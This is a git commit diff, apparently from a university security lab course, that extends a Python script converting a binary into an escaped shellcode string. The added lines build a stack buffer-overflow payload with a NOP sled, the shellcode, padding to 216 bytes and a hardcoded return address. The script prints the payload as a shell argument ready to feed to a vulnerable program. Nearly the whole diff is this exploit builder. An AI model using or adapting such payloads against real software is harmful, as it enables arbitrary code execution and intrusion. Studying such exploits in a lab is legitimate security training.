d0353c357b5d3c6dea1b6a871778dd4b4cca191e
David Sugar <foobarc11@protonmail.ch>
2020-01-05 15:04:29 +0100

    script added

--- Praktikum3/Code/convert.py
+++ Praktikum3/Code/convert.py
@@ -4,6 +4,8 @@ import sys
 
 shellcode = ""
 count   = 0
+payload = ""
+payload2 = ""
 
 file = open(sys.argv[1], 'rb')
 
@@ -11,5 +13,17 @@ for byte in file.read():
     shellcode += "\\x" + byte.encode("hex")
     count += 1
 
-print(shellcode)
-print(count)
+z=216-count
+x=z//8
+y=z%8
+
+payload += "\\x90"*(x*8)
+payload += shellcode
+payload += "A"*y
+payload += "\\x10\\xdd\\xff\\xff\\xff\\x7f"
+
+payload2 += shellcode
+payload2 += "A"*(216-count)
+payload2 += "\\x10\\xdd\\xff\\xff\\xff\\x7f"
+
+print("\"$(python -c 'print \"" + payload2 + "\"')\"")
